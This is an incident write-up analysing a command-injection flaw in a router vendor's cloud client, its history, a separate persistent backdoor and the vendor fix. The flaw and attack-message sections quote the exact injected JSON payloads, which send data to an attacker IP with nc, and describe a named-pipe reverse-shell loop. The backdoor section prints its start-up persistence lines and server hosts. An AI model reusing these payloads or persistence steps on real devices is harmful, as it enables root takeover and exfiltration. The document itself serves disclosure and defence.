# Technical breakdown: the flaw, its history, and the fix

The long version of the router side of the incident of 20 November 2026: the code the attack came
through, how we read it, when it entered GL.iNet's firmware, what was sent through it, the older
backdoor found beside it, and what the fixed firmware changes. The short page is the
[README](../README.md); every finding has a row in [findings.md](findings.md). Times are UTC.

Each statement says how it is known. "Read in a listing" means we read the compiled code
instruction by instruction. "Read in strings" means we only found the text in the file. "Measured"
means we saw it on routers we manage or own. "Reported" means someone else saw it and we did not
check it.

Last updated: 2026-11-22.

## Summary

- The GoodCloud client's handler for the cloud command `virtual_ip_info` formats two values from
  the message into an `iptables` command and runs it as root through the shell, unchecked, whether
  or not AstroWarp is in use (read in a listing).
- The earliest release we find it in is GL-MT3000 4.7.0, released 5 December 2024: 715 days in
  released firmware before the attack (read in GL.iNet's release images).
- On 20 and 21 November 2026 it ran a remote root shell on some GL-AXT1800 and GL-MT6000 routers,
  and on most others a one-shot command that looked for a KVM implant (measured).
- A separate, older backdoor was running on 49 of the routers we checked, installed in batches
  from September 2025 to May 2026. How it was installed is not known.
- The fixed firmware adds input checks to that handler (read in GL-MT3000 4.11.1 only). Its
  clean-up is one short script, the same in the seventeen fixed builds we unpacked. In a test,
  an upgrade with settings kept removed the start-up routes that script names; other start-up
  entries placed in kept settings survived and ran. One further weakness in the cloud client is
  not addressed and is withheld.

## The component

The GoodCloud client is the package `gl-sdk4-cloud`. Its main program is `/usr/bin/gl-cloud`,
started as `/usr/bin/eco /usr/bin/gl-cloud` by the init script `/etc/init.d/gl-cloud` (read in the
GL-AXT1800 4.8.4 image). The init script returns without starting it unless the option
`gl-cloud.@cloud[0].enable` is `1`, which is the GoodCloud switch on the device (finding R-6). On
every router where we switched GoodCloud off, the client process was gone afterwards (measured).

The AstroWarp part of the client is the module `cloud/astrowarp.lua`:

- `/usr/local/lib/lua/5.4/cloud/astrowarp.lua` in firmware 4.8.0 and later;
- `/usr/local/lib/lua/5.3/cloud/astrowarp.lua` in the 4.7 line.

The package is shipped as compiled Lua bytecode, not as source. `file` reports the GL-MT3000 4.8.1
module as "Lua bytecode, version 5.4" and the 4.7.0 module as "Lua bytecode, version 5.3". The
bytecode is not stripped: it still carries the source line numbers, which is why the line
numbers below can be given at all.

We have not found the source published. What we searched, on 22 and 23 November:

- GL.iNet's build kit (`glbuilder`) as we hold it, 27 GB with the SDKs of nine model and firmware
  combinations and the GL.iNet and OpenWrt feeds those SDKs check out; GL.iNet's `gl-image`
  repository; and the feeds of a 4.9.0 image build, which include GL.iNet's `mptcp-feeds`.
- By name: no file or folder named `*gl-sdk4-cloud*` in any of them.
- By content, every file, binary files included: no file contains `virtual_ip_info`. One file
  contains `SDWAN_IP_MAPPING`: a shell script in `mptcp-feeds` (`aw-s2s/files/mptun.sh`), which
  uses the name in a comment on a different firewall rule. It belongs to the package `aw-s2s`
  ("AstroWarp s2s API"), not to the cloud client.
- The build kit knows the cloud client only as a ready-made package: its configuration lists
  `gl-sdk4-cloud` per model and firmware version as something to include, with no source and no
  build recipe for it.
- A repository search for `sdk4-cloud` and a code search for `virtual_ip_info` over GL.iNet's
  GitHub organisation: no result.

That is "not found by us in these places", not proof that it exists nowhere: a code search can
miss files that are not indexed, and we hold a copy of the build kit, not every branch of every
repository.

## The flaw

The handler is `commands.astrowarp.virtual_ip_info` (read in a listing of the 4.8.3, 4.8.4 beta2
and 4.11.0 builds). For each entry in `astrowarp.virtual_ip_info.data` of the message it takes
three fields: `mac`, `virtualIp` and `ip`.

- When `mac` is missing or empty, it takes a branch the code labels "Manually add ip" and runs
  `os.execute` on this format string, filled with the chain name, `virtualIp` and `ip`:

  ```
  iptables -t nat -A %s -d %s -j DNAT --to-destination %s
  ```

- When `mac` is present, it looks up the LAN device with that hardware address and runs the same
  format with `virtualIp` and that device's address.
- Neither `virtualIp` nor `ip` is checked or quoted. A missing `ip` only logs an error.
- The handler never checks whether AstroWarp is enabled (finding R-4). AstroWarp was not enabled
  on any of the 193 routers whose setting we recorded, including all that had been called
  (measured).
- Before the loop, every call flushes the chain `SDWAN_IP_MAPPING` (source lines 679 and 680 in
  4.8.3). A rule found on a router therefore comes from the last call it received.
- At the end it rewrites `/etc/mp_ip_mapping_info`. With only entries that have no `mac`, it
  writes an empty file.
- It returns nothing. The client's request loop in `/usr/bin/gl-cloud` (source lines 1302 to 1315
  in 4.8.4 beta2) then sends a reply to the cloud with `code` 0 and an empty `astrowarp` entry.

The logic, as a sketch. **This is reconstructed by us from an instruction listing of the 4.8.3
build. It is not GL.iNet's source, and names other than the message fields, the format string and
the file name are ours.**

```
-- reconstructed from an instruction listing; not GL.iNet's source
function commands.astrowarp.virtual_ip_info(msg)
    local entries = msg.astrowarp.virtual_ip_info.data
    os.execute("iptables -t nat -F SDWAN_IP_MAPPING")
    for _, e in ipairs(entries) do
        if e.mac == nil or e.mac == "" then                       -- "Manually add ip"
            if e.ip == nil then log_error(...) end
            os.execute(string.format(
                "iptables -t nat -A %s -d %s -j DNAT --to-destination %s",
                "SDWAN_IP_MAPPING", e.virtualIp, e.ip))
        else
            local addr = address_of_lan_device(e.mac)
            os.execute(string.format(<same format>, "SDWAN_IP_MAPPING", e.virtualIp, addr))
        end
    end
    write_file("/etc/mp_ip_mapping_info", ...)                    -- empty if no entry had a mac
end                                                               -- returns nothing
```

Because the line goes to a shell, a value such as `127.0.0.1;<any command> &` in `ip` produces a
valid rule followed by the attacker's command, run as root. The command line of the shell found
on our own router is exactly what this branch produces for `virtualIp` = `127.0.0.1` and an `ip`
value that starts `127.0.0.1;` (see [router-reverse-shell.md](router-reverse-shell.md)).

Where the handler sits in each build we read in a listing (source line numbers left in the
bytecode). In each, the format string is loaded on the first line given and passed to
`os.execute` on the next, with nothing in between that checks or quotes the two values.

| Firmware | `gl-sdk4-cloud` build | Handler, source lines | Unchecked `os.execute`, no `mac` | With `mac` |
|---|---|---|---|---|
| GL-AXT1800 4.8.3 (our router, equal to the image) | git-2025.221.26985-238a59d | 628 to 743 | 720 to 721 | 729 to 730 |
| GL-AXT1800 4.8.4 beta2 (router) | git-2026.079.37477-54c8134 | 724 to 839 | 816 to 817 | 825 to 826 |
| GL-MT3000 4.11.0 (router) | git-2026.240.26473-4c68d9a | 715 to 830 | 807 to 808 | 816 to 817 |

## How it was read

1. On 21 November we copied the client's files from our own compromised router, a GL-AXT1800 on
   4.8.3, and from a second router of ours, a GL-AXT1800 on 4.8.4 beta. The module files on the
   4.8.3 router were equal to those in the firmware image.
2. The standard Lua 5.4 tool (`luac5.4 -l -l`, version 5.4.6) refused them. Its loader expects a
   16-byte check block in the file header (an integer, then a floating-point number, used to
   verify the format). These files have a single byte, `00`, at offset 15 in its place.
3. We wrote copies with the standard 16-byte block put back. The stock tool then lists them.
4. We read the handler and the client's message path in those listings. That is a disassembly:
   instructions, constants and line numbers. We did not decompile it to source.
5. The shell's command line on the router matched what that branch builds.

**Where the non-standard header comes from.** It is a side effect of a build patch that GL.iNet
publishes, and it applies to every compiled Lua file on the router, not to the cloud client in
particular:

- GL.iNet's Lua 5.4 package carries `030-archindependent-bytecode.patch`. In `src/ldump.c` it
  replaces the integer and number written into the header with one byte: 0 on a little-endian
  build, 1 on a big-endian one. In `src/lundump.c` it removes the two matching checks and reads
  that byte to decide whether to swap byte order while loading. Its purpose, as its name says, is
  that bytecode compiled on one architecture loads on another. We read it in full on 22
  November.
- It is public: repository [gl-inet/gl-feeds](https://github.com/gl-inet/gl-feeds), branch
  `common`, path `lua5.4/patches/030-archindependent-bytecode.patch`, added on 9 April 2025 in
  commit `f5f15d5` ("feat: add patch for archindependent bytecode for lua5.4").
- A patch with the same file name is in OpenWrt's own Lua packages, in the same SDK tree and in
  GL.iNet's `gl-image` 4.8.7 and 4.9.0. We did not compare the texts of these patches.
- The single byte `00` we found at offset 15 is exactly what this patch writes on a little-endian
  build.

Later, for the fixed firmware, we built `luac` from GL.iNet's published Lua 5.4.7 source with that
patch applied. It lists GL.iNet's bytecode with no header repair (finding R-19).

## History: where the code came from

We took the AstroWarp module out of GL.iNet's release images (each image matched its published
SHA-256) and out of routers, and looked for the handler in each. "Listing" means read instruction
by instruction; "strings" means found by its text only.

| Model and firmware | Released | `gl-sdk4-cloud` build | Handler | How we read it |
|---|---|---|---|---|
| GL-MT3000 4.6.9 | 2024-10-30 | git-2024.212.35538-b994e0f | absent | strings: Lua 5.3 module `gl/astrowarp.lua`, no handler |
| GL-AXT1800 4.6.11 | ten days after GL-MT3000 4.7.0 | git-2024.212.35538-b994e0f | absent | strings: no file in the image contains `virtual_ip_info`, `SDWAN_IP_MAPPING` or `mp_ip_mapping` |
| GL-MT3000 4.7.0 | 2024-12-05 | git-2024.337.34278-f047c96 | present | strings: module now `5.3/cloud/astrowarp.lua`, with the handler name, "Manually add ip", the format string, the chain name and the state file name |
| GL-MT3000 4.7.4 | 2025-03-28 | git-2025.077.10369-9c7a8e3 | present | strings, as 4.7.0 |
| GL-MT3000 4.8.0 | 2025-07-23 | git-2025.192.29740-342a37f | present | strings; first Lua 5.4 build we hold |
| GL-MT3000 4.8.1, GL-AXT1800 4.8.2 | 2025-08-19, 2025-09-04 | git-2025.221.26985-238a59d | present | the same build as GL-AXT1800 4.8.3; the 4.8.2 file has the same size, 35,703 bytes |
| GL-AXT1800 4.8.3 | | git-2025.221.26985-238a59d | present | listing |
| GL-AXT1800 4.8.4 beta2 | built 2026-11-11 | git-2026.079.37477-54c8134 | present | listing |
| GL-MT3600BE 4.9.0 | | git-2026.132.12561-8d0e1ce | present | strings: handler name, "Manually add ip", the format string |
| GL-MT3000 4.11.0 | built 2026-09-24 | git-2026.240.26473-4c68d9a | present | listing |

What the table shows:

- The handler follows the build of the cloud package, not the firmware number. Package build
  git-2024.212, in GL-MT3000 4.6.9 and GL-AXT1800 4.6.11, already had an AstroWarp module, under
  `gl/astrowarp.lua`, without this handler. It appears between builds git-2024.212 and
  git-2024.337, together with the move of the cloud modules from `gl/` to `cloud/`, while the
  client was still Lua 5.3. The Lua 5.4 build came later, with 4.8.0.
- The earliest release in which we find it is GL-MT3000 4.7.0, released 5 December 2024. The
  4.6.9 release of the same model, five weeks earlier, does not have it. GL-MT6000 4.7.0 carries
  the same build, git-2024.337 ([router-reverse-shell.md](router-reverse-shell.md)). From 5
  December 2024 to 20 November 2026 is 715 days.
- The 4.6 line kept the old package. GL-AXT1800 4.6.11, released after 4.7.0, has no handler. In
  the [field survey](field-survey.md), none of the routers on 4.6.x shows the attack.

Limits:

- The 4.7 builds are Lua 5.3 bytecode and were confirmed by strings only: the handler name, the
  format string, and no validation message. That the two values were unchecked in those builds
  too is our reading from the identical strings, not read in the bytecode. The 4.8.3, 4.8.4 and
  4.11.0 builds were read in a listing.
- GL-AXT1800 and GL-AX1800 routers on 4.7.0 in the field carry package build git-2025.062, which
  we have not read. It lies between two builds that both have the handler (git-2024.337 and
  git-2025.077). The earliest GL-AXT1800 image in which we have read the handler is 4.8.2; we did
  not read that model's 4.7 images, so 4.8.2 is not its first.
- When the cloud side became usable by an outsider is not known to us. GL.iNet has not said.

## What was sent through it on 20 and 21 November

Three kinds of message are known from routers we manage or own. All three used this handler the
same way: empty `mac`, `virtualIp` set to `127.0.0.1`, and a command appended to `ip` (read in the
recovered messages, and in the shell's command line where the message was gone). That is why the
firewall rule `-A SDWAN_IP_MAPPING -d 127.0.0.1/32 -j DNAT --to-destination 127.0.0.1` appears
wherever it ran.

**1. The interactive shell.** Measured on 24 routers in the [field survey](field-survey.md):
GL-AXT1800 on 4.8.2 and 4.8.3, and GL-MT6000 on 4.9.1. The appended command is a loop that makes
a named pipe `/tmp/f`, joins `/bin/sh -i` to `nc 170.39.226.219 <port>` through it, and starts
again three seconds after the connection ends. The full command line is in
[router-reverse-shell.md](router-reverse-shell.md). Start times, from the kernel's process start
times: on our own GL-AXT1800 4.8.3, 21:40:24 on 20 November; on one GL-AXT1800 4.8.2, three shells
at 20:46:35, 21:17:27 and 21:39:45; on a second, 21:39:47. Across the routers, shells started
between 20:06 and 21:40 UTC on 20 November. Routers that had not been restarted still had the
shell on 22 November. On the GL-MT6000 routers it was not connected: the loop was retrying
against the address every few seconds (finding R-13). The loop will reconnect by itself if that
server answers again.

On our own router the handler was called at least three times: at 20:47:14 (state file created,
no shell), 21:40:24 (the call that started the shell; the pipe was created in the same second) and
22:15:18 (last write). So not every call carried a shell.

On one GL-AXT1800 4.8.2, two of its three shells still held text typed through them, saved from
the shells' memory before we ended them: fragments of the same folder check that is described
next (finding R-16). A shell keeps only the last lines it parsed, so this is not a full record of
what was typed.

**2. The one-shot folder check.** Recovered from the memory of the running cloud client on seven
routers: GL-MT3000 and GL-MT5000 on 4.9.0, and GL-MT3600BE on 4.8.5 and 4.9.0 (finding R-15). On
these the client had run since boot and still held the message. It is the same on all seven apart
from a device identifier. What the appended command does: it lists the folders `/etc/config/.gl`
and `/etc/glinet/.cache`, which belong to the KVM implant called "gl-helper"
([kvm-firmware.md](kvm-firmware.md)), tags the listing with the device identifier and sends it
to `170.39.226.219`. It installs nothing. Another owner recovered the same message from a
GL-BE9300 (Reported).

The message, exactly as recovered (401 bytes). `<id>` stands for the router's own identifier,
twelve hexadecimal characters in the form of a hardware address without separators; it is the
only part that differs between the seven routers:

```json
{"id": 1, "astrowarp": {"virtual_ip_info": {"data": [{"mac": "", "virtualIp": "127.0.0.1", "ip": "127.0.0.1;(echo MKX<id>; echo \"===S===\"; ls -ld /etc/config/.gl 2>&1; echo \"===L===\"; ls -la /etc/config/.gl 2>&1 | head -40; echo \"===C===\"; ls -la /etc/glinet/.cache 2>&1 | head -20; echo \"LL<id>\n===E===\"; echo EE<id>) | nc 170.39.226.219 50000 >/dev/null 2>&1 &"}]}}}
```

Read as a command, after the handler has put the `ip` value into its `iptables` line, the part
after the semicolon runs as root:

```sh
(echo MKX<id>; echo "===S==="; ls -ld /etc/config/.gl 2>&1; echo "===L==="; ls -la /etc/config/.gl 2>&1 | head -40; echo "===C==="; ls -la /etc/glinet/.cache 2>&1 | head -20; echo "LL<id>
===E==="; echo EE<id>) | nc 170.39.226.219 50000 >/dev/null 2>&1 &
```

So what reached the attacker's port 50000 from each router was: a start marker with the
router's identifier, the listing of the two implant folders (or the "No such file" errors),
and two end markers. The `"id": 1` at the front is why the cloud's own log shows these replies
with the number 1 where ordinary commands carry a 32-character id.

The full catalogue of what we recovered, with counts by model, is in
[attacker-messages.md](attacker-messages.md): this message was still in the memory of 98 routers.

On the routers where the call was recorded twice, we found this one text only. On one more router
of the same batch the message was no longer in memory; on routers that had restarted nothing was
left to read. From the router we cannot see whether the connection completed, what the server
did with the answer, or whether a router that answered "the folders exist" was then sent
something else.

**3. A message that tried to end the shell.** On one GL-AXT1800 4.8.2 with live shells, the
client's memory held one more `virtual_ip_info` message, built the same way (249 bytes):

```json
{"id": 1, "astrowarp": {"virtual_ip_info": {"data": [{"mac": "", "virtualIp": "127.0.0.1", "ip": "127.0.0.1;pkill -9 -f \"mkfifo /tmp/[f]\"; pkill -9 -f \"/tmp/.l[p]\"; pkill -9 -f \"cat /tmp/[f]\"; pkill -9 -f \"nc 170.39.226.21[9]\"; sleep 1"}]}}}
```

Its appended command calls `pkill -9 -f` four times to end, by name, the processes of the shell
loop: the `mkfifo /tmp/f` loop, `cat /tmp/f`, the `nc` to the attacker's address, and anything
whose command line contains `/tmp/.lp`. That last name is not one we have seen on a router; it
suggests a further tool, or a variant of the shell that used a file of that name. The square
brackets are the usual way to keep such a pattern from matching the `pkill` command itself. `pkill` is not present on
GL-AXT1800 firmware 4.8.2, 4.8.3 or 4.8.4 (read on that router and on two of ours), so it ended
nothing: the three shells were still running when we found them. It matches that router's last
call, 22:14:38 on 20 November. The last calls on two other GL-AXT1800 routers fall at 22:14:17
and 22:15:18; we do not know whether those carried the same message. **Who sent it is not known.**
The messages that opened the shells were no longer in that router's memory.

**Timing by model.** The first call on each router is the creation time of
`/etc/mp_ip_mapping_info`. The router's writable layer is mounted `noatime`, so the file's access
time stays at its creation; we cross-checked it against the change time of `/etc`. The last call
is the file's modification time. First calls measured on routers we manage or own:

| Model and firmware | First call (UTC) | Routers |
|---|---|---|
| GL-MT6000 4.9.1 | 20 Nov 20:06:41 (earliest we have) | routers with the shell |
| GL-AXT1800 4.8.2 | 20 Nov 20:46:35 and 20:46:37 | two |
| GL-AXT1800 4.8.3 | 20 Nov 20:47:14 | our own router |
| GL-MT3000 4.9.0 | 21 Nov 00:21:12 to 00:22:59 | four |
| GL-MT5000 4.9.0 | 21 Nov 01:40:55 to 01:41:42; a second call 06:44:50 to 06:45:21 on four of the five | five |
| GL-MT3600BE 4.9.0 | 21 Nov 04:39:39 | one |
| GL-MT3000 4.7.4 | 21 Nov 07:44:15 and 07:49:52 | two |

For GL-MT3000, GL-MT5000 and GL-MT3600BE on 4.9.0, the first calls fall within about two minutes
per model, across unrelated networks: the calls came in batches per model. Why in this order is
not known. In the first detailed set we read, every router on 4.9.0 that had not restarted had
been called (8 of 8), and the two on 4.11.0 that had not restarted had not; why is not known, and
4.11.0 has the handler.

## The traces it leaves

Described in the README under
[The signs, and what each one means](../README.md#the-signs-and-what-each-one-means). In short:

- **The firewall rule** in `SDWAN_IP_MAPPING`, mapping `127.0.0.1` to itself. It is the wrapper the
  command arrived in. It is gone after a restart, and also when GoodCloud is switched off: the
  client's init script flushes and deletes the `SDWAN_IP_MAPPING` chains when the service stops
  (read in the GL-AXT1800 4.8.3 and 4.8.4 images, not in a 4.9.0 image), and on routers we
  switched off without a restart the rule was gone afterwards (measured).
- **The state file** `/etc/mp_ip_mapping_info`, empty. It survives a restart. Its two times give
  the first and last call (above). It does not show what the message carried.
- **The pipe** `/tmp/f`, where the shell ran. It stays after the shell is stopped, until the next
  restart.
- **The cloud log entry**, kept on GL.iNet's side: a reply with the id `1` for each call. Reported
  by one owner; we have not checked it. The reply shape matches what the code sends (above).

## The older backdoor

*Added 23 November: the mechanism step by step, and what forum users have decoded of the loader
(its hidden strings, the server protocol and its key, the two sets of server names and when they
were registered), is in the README under
[The older backdoor, step by step](../README.md#the-older-backdoor-step-by-step). This section
holds our own measurements.*

A separate compromise, first reported by forum users in
[this forum thread](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097).
We found it installed and running on 49 routers we manage (finding R-11): GL-MT2500, GL-MT3000,
GL-MT6000, GL-AX1800 and GL-AXT1800, on firmware 4.7.0 to 4.11.0.

Its parts, as measured on those routers:

- **Start-up script.** Five lines added at the top of `/etc/init.d/urandom_seed`. They copy
  `/usr/bin/lua` to `/usr/bin/monitord`, copy `/bin/ulogd` to `/var/run/monitord.pid`, run it,
  wait, and delete the copy. The changed file has SHA-256
  `3265f27feb954744581cdea2373b88ceae9d85b67e90487353fd48902cf4fc19`, the value forum users
  report, on all 49 routers. The lines, added directly under the script's first line:

  ```
  cp /usr/bin/lua /usr/bin/monitord
  cp /bin/ulogd /var/run/monitord.pid
  /usr/bin/monitord /var/run/monitord.pid &
  sleep 2
  rm /var/run/monitord.pid
  ```

  On the one router where we timed it (GL-MT3000 4.7.4) the loader started 36 seconds after
  boot and the second stage about five minutes after boot.
- **`/bin/ulogd`.** A different SHA-256 on every router (49 routers, 49 values), in two sizes:
  33,722 bytes on 42 of them and 35,745 bytes on 7. The hashes differ because each copy carries
  its own 40-character identifier, which it sends to the server as `randomkey`; within each size
  every other byte is the same
  ([the loader, section 5](older-backdoor-loader.md#5-the-per-device-identifier)). It is compiled Lua 5.1 bytecode, not a native
  program. Its internal names are random six-letter strings and its text constants are not
  readable as they stand. Decoded in full on 23 November: see
  [the loader](older-backdoor-loader.md).
- **`/usr/bin/monitord`.** One SHA-256 on every MediaTek router (12,299 bytes) and another on
  every Qualcomm one (65,547 bytes). That is consistent with a copy of the router's own Lua
  interpreter, which is what the start-up lines copy. The MediaTek value,
  `dc824e186b783450961d98709b458c7be82f40f9a0cfdbef0693dbfc37b10b46`, is the SHA-256 of
  `/usr/bin/lua5.1` in GL.iNet's GL-MT3000 4.11.1 image, so on those routers it is that file
  byte for byte.
- **The second stage, `ujaild`.** Runs as `/usr/sbin/ujaild` from a file in `/tmp` that is
  deleted once it has started. The copy from a GL-MT3000 is a statically linked 64-bit ARM
  program with its symbols removed, and carries a Go build marker. Copied from the running process on all 49 routers, it has two
  SHA-256 values:
  - `311b5767e7d63e7dbdc1476c36608b8d7ef729c8bbcc64ded63b9470396351d6`, 6,815,892 bytes, 42
    routers; the same as a sample another owner collected from a GL-AX1800 (Reported);
  - `53736d5db721a358bec5b9ddf6056df73b36fc5330300342c42f866a05191432`, 6,750,356 bytes, 7
    routers, the same seven that have the 35,745-byte `ulogd`.

  Both values appear on GL-MT3000, GL-MT2500 and GL-MT6000, so they are two versions, not two
  platforms.
- **The keep-list line.** `/bin/ulogd` and `/etc/init.d/urandom_seed` added to
  `/lib/upgrade/keep.d/netifd`, so that an upgrade with settings kept carries both over. On 9 of
  the 49 routers it was missing while the rest of the backdoor was there and running.
- **Its servers.** In the saved memory of the loader and second stage on two GL-MT3000 4.7.4
  routers: a reply telling the loader what to download, and the second stage's check-in answered
  with `200 OK`, on hosts named `cdn.adguardns.com`, `cdn.adguardns.org`, `up.adguardns.com` and
  `up.adguardns.org`. So its servers were answering on 21 November 2026. The names imitate
  AdGuard; we have nothing that links them to AdGuard. Forum users decoded the same names
  (Reported).

**When it was installed.** On the 40 of the 49 routers whose clock gave a real date, the files
are dated from 15 September 2025 to 24 May 2026. They fall on a small number of days (finding
R-18): 15 September 2025; 13 October 2025; 7, 9, 12, 14, 16, 17, 19, 20, 21 and 29 December
2025; 1 January 2026; 6, 7 and 27 February 2026; 1, 28 and 29 March 2026; 21, 23 and 24 May 2026.
On 20 December 2025 it reached 11 routers on 11 different networks, six of them within 14
minutes. On two GL-MT3000 4.7.4 routers of unrelated owners the files are 35 seconds apart, at
10:34:02 and 10:34:37 that day. These are the routers' own clocks.

**Where the routers were.** 44 of the 49 have no public address on their WAN port, so they are not
directly reachable from the internet. Each of the 38 we could check was bound to GoodCloud before
its install date, and each runs a build of the cloud package later than the one in which the
handler first appears (finding R-18).

**The VPN server configuration.** On 27 of 30 backdoor routers with a dated install,
`/etc/config/wireguard_server` was changed 9 to 12 seconds after the backdoor files were written;
on the other three it was changed much later. We had saved only its change time, so what changed
is not known. Three explanations are ruled out:

- No WireGuard peer public key appears on more than one network (0 over 157 routers with the
  configuration read, 37 of them backdoor routers), so the installer did not add one shared peer.
- One peer name is more common on backdoor routers (17 against 5), but it is the first peer in
  nearly every case, so it dates from setup, not from the installer.
- It is not a side effect of the cloud handler: on 132 routers with both a state file and a dated
  change of that configuration, none changed within two minutes after a handler call in
  November.

A plain text search of the saved `ulogd`, start-up script, `ujaild` and `monitord` from three
routers found no match for "wireguard", "wireguard_server", "uci " or `wg show|set|genkey`. The
binaries may hide their strings, so that is not a negative.

**How it was installed is not known.** We have no direct evidence that it came through the cloud.
The batch dates across unrelated networks, routers with no public address, and binding to
GoodCloud before each install date are why the cloud is the first question to ask. They do not
show that it was the route.

## The fix

GL.iNet's listing holds stable router firmware dated 22 and 23 November 2026 for eighteen
models: GL-MG1300, GL-MT3000 and GL-MT6000 (4.11.1), GL-E5800 (4.10.3), GL-BE3600 and GL-BE9300
(4.10.2), GL-BE14000 (4.9.3), GL-BE6500, GL-MT3600BE and GL-MT5000 (4.9.1), GL-BE10000 (4.8.7),
GL-AX1800, GL-AXT1800, GL-SFT1200, GL-X3000 and GL-XE3000 (4.8.4), GL-MT2500 and GL-X2000
(4.7.14). That is the list at 01:18 UTC on 23 November; at 23:10 on 22 November it held eleven
(finding R-10). All of these builds, and the ones they replace, are on our
[firmware mirror](https://gl-fw.remotetohome.io/).

What we read in GL-MT3000 4.11.1 against 4.11.0. Both official images matched their published
SHA-256. We compared them file by file and read the changed module and the new checker in a
listing (finding R-19).

- The cloud package went from build git-2026.240.26473-4c68d9a (4.11.0) to
  git-2026.323.29141-d7574f9 (4.11.1). `cloud/astrowarp.lua` is the file that changed in
  substance; it grew from 37,744 to 40,695 bytes.
- **Rules.** A table at the top of the module (source lines 30 to 35) declares, for
  `virtual_ip_info`, `data` entries with `ip` and `virtualIp` as IPv4 addresses and `mac` as a
  hardware address. `connection_info` and `global_ip_set` have rules as well.
- **Checker.** A new module, `mpifd/parameter_validator.lua`. Its IPv4 rule is a pattern of four
  dot-separated numbers, each compared against 255.
- **Handler.** Now at source lines 841 to 965. It returns an invalid-parameter result when the
  field is missing. If the checker is not loaded, it logs "no parameter_validator" and returns:
  it fails closed. It calls the checker on the message and, when the check fails, logs
  "Invalid virtual_ip_info:" and returns. All of this happens before any command is built.
- The same `iptables` format string is still there, after the check, at source lines 942 and 951.
  The handler still builds the command the same way; what is new is that the values are checked
  first.
- We have not sent the attack message to a fixed router to watch it being refused.

**The clean-up script.** The same firmware adds a package `gl-sdk4-system-check` with the script
`/etc/uci-defaults/00-system-check`, which runs once at the first start after the update. We read
all 46 lines (finding R-20).

- It restores `/etc/init.d/urandom_seed` from the copy under `/rom` whenever the two differ. That
  is the start-up file the older backdoor changes.
- Only if `/etc/config/.gl` exists, it removes that folder, one line in `/etc/rc.local` that runs
  a `boot.sh` from it, and scheduled-task lines that run `watch.sh`, `wake.sh` and `rtty_keep.sh`
  from `/etc/glinet/.cache`.
- It does not remove `/bin/ulogd`, `/usr/bin/monitord`, the keep-list line or
  `/etc/glinet/.cache` itself. Restoring the start-up script removes the lines that start the
  backdoor at boot; we have not tested what still runs after the update.

**The same script in every build (finding R-23).** On 23 November we took the fixed build of
each of the eighteen models from the mirror, each matching its published SHA-256, and unpacked
seventeen (the GL-E5800 file is in a format we could not open).

- All seventeen carry `gl-sdk4-system-check` 1.0-1 with one file, the script above, byte for
  byte the same: SHA-256 `1632adc736f1f84c0df3fb84846dbf10c05908ee5ceb41b273176cb4d1fbf6c5`.
- A plain-text search of every unpacked file for `ulogd`, `monitord`, `ujaild`, `adguardns` and
  `config/.gl` finds the last only in that script and the others nowhere. So the script is the
  whole clean-up. The search would not see a name held inside compressed data.
- The cloud package build differs by model: git-2026.323 (GL-MT3000, GL-MT6000, GL-MG1300),
  git-2026.325 (GL-BE10000, GL-BE14000, GL-BE3600, GL-BE6500, GL-BE9300, GL-MT3600BE,
  GL-MT5000, GL-SFT1200, GL-X2000) and git-2026.326 (GL-AX1800, GL-AXT1800, GL-MT2500,
  GL-X3000, GL-XE3000).
- In GL-MT3000 4.11.1 the script runs at boot step 10, before the scheduled-task service (50)
  and before the start-up script it restores (99).
- The handler fix above was read in the GL-MT3000 build only. We have not read it in the other
  sixteen.

**What an upgrade with settings kept leaves behind (finding R-24).** GL.iNet's notice of
23 November says the security firmware removes the malware and that settings can be kept. We
tested that on a GL-MT3000 with harmless stand-ins: files of our own that only write a log line
when they run, placed where the known persistence sits and in other places that an upgrade
keeps. Controls: before placing them, none present; after a restart on 4.11.0, every one that
can run had run. Then the upgrade to 4.11.1, settings kept.

| Placed before the upgrade | After the upgrade | Ran on 4.11.1 |
|---|---|---|
| The changed start-up file of the older backdoor | Put back to the firmware's own | No |
| `/bin/ulogd`, with the backdoor's own line in the upgrade keep list | Still there | No |
| `/usr/bin/monitord` | Gone: an upgrade does not carry it | No |
| `/etc/config/.gl` with a `boot.sh`, its `rc.local` line, three scheduled-task lines | Removed by the script | No |
| `/etc/glinet/.cache`, a replaced `netstat` | Gone: an upgrade does not carry them | No |
| An added SSH key; an added account | Still there | (these do not run) |
| A different line in `rc.local` | Still there | Yes, at boot |
| A different scheduled-task line | Still there | Yes |
| A script in `/etc/udhcpc.user.d` | Still there | Yes, at boot |
| A script in `/etc/profile.d` | Still there | Not triggered in the test |

- The script does what it says: the start-up routes it names are removed before they run.
- `/bin/ulogd` survives only because the backdoor adds it to the keep list. A file placed in
  `/bin` without that line is dropped by any upgrade. After the upgrade the keep-list line
  itself is gone, because the keep list is the new firmware's.
- Everything the script does not name is carried over with the settings. The keep list in
  4.11.1 is not narrowed: all of `/etc/config`, the scheduled-task tables, `/etc/rc.local`,
  the SSH server's authorised keys, the account and password files, `/etc/udhcpc.user.d` and
  `/etc/profile.d`.
- On 4.11.0 the firmware itself ran the replaced `netstat` 133 times in five minutes, so a
  replaced `netstat` does not wait for the owner to type the command.
- Limits: one router, one model, upgraded with the router's command-line upgrade tool (the web
  interface runs the same tool; which options it passes was not read). The stand-ins copy file
  names and start-up routes, not the real programs. A real implant that is running during the
  upgrade is not covered.

**What a reinstall replaces (finding R-25).** Read on the same GL-MT3000: the upgrade removes
and recreates the kernel, the firmware image and the writable layer. It does not write the boot
loader partitions or the partition that holds the device's own data (serial number, hardware
address, DDNS id, country code); a factory reset clears only the writable layer. No
before-and-after comparison of those partitions was made.

**KVMs.** The same test on an RM1, upgraded from 1.10.2 to 1.10.3 through its web interface with
the configuration kept: a boot script and an added SSH key both survived, and the script ran at
the first boot (finding K-12, [kvm-firmware.md](kvm-firmware.md)).

## What is still open

1. **One further weakness in the cloud client.** It is separate from the handler and not
   addressed in GL-MT3000 4.11.1: the component involved is byte for byte the same as in 4.11.0
   (finding R-21). It was reported to GL.iNet on 22 November 2026 and is not described here
   until it is fixed.
2. **How the older backdoor was installed.**
3. **What changed in `/etc/config/wireguard_server`** 9 to 12 seconds after each backdoor install.
   Only a copy of the file from before, or GL.iNet's records, can show it.
4. **Whether devices with the cloud service on but not bound to an account were reachable.**
5. **Whether the fixed firmware of every model carries the same handler fix.** We have read it
   in one. The clean-up script is the same in the seventeen builds we unpacked; the GL-E5800
   build is unread.
6. **Who sent the message that tried to end the shells**, and whether routers that reported the
   implant folders were sent anything further.

## Method and limits

The routers are ones we manage or own: 199 reached by 22 November, 166 of them showing the attack
